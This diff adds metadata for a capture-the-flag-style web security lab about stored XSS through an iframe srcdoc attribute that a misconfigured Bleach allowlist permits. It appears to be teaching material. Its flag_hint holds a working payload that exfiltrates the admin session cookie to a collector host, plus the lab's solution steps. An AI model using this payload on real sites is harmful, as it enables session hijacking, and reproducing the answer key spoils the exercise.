@@ -1,0 +1,45 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "iframe-srcdoc-attribute-injection",
+  "title": "Stored XSS via iframe srcdoc (Bleach allowlist misconfig)",
+  "track": "xss",
+  "difficulty": "practitioner",
+  "estimated_minutes": 35,
+  "max_lifetime_minutes": 50,
+  "learning_objectives": [
+    "Recognise that an HTML sanitizer allowlist vets tag/attribute names, not attribute value semantics — allow-listing <iframe srcdoc> re-opens stored XSS",
+    "Understand the about:srcdoc browsing context: a srcdoc document inherits the parent origin, so script inside it runs with the parent's cookies",
+    "Craft a stored-XSS payload that survives Bleach 6 sanitization and fires when a higher-privileged victim renders the feed",
+    "Exfiltrate a non-HttpOnly admin session cookie to an out-of-band collector across an egress-dropped network",
+    "Identify the correct fixes: drop iframe/srcdoc from the allowlist, and mark the session cookie HttpOnly"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-comment-plain"],
+  "flag_hint": "POST /posts {\"body\":\"<iframe srcdoc=\\\"<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>\\\"></iframe>\"}; the admin bot renders it on GET /admin/feed and the srcdoc script runs in about:srcdoc (parent origin), exfiltrating its non-HttpOnly session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "Bleach 6.2 (iframe+srcdoc in allowed_attributes)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "stored-xss",
+    "iframe-srcdoc",
+    "bleach",
+    "sanitizer-bypass",
+    "allowlist-misconfig",
+    "cookie-theft",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The iframe srcdoc sanitizer-bypass class (allow-listing <iframe srcdoc> in an HTML sanitizer), abstracted for local Docker with a Playwright victim bot and an OOB collector"
+}
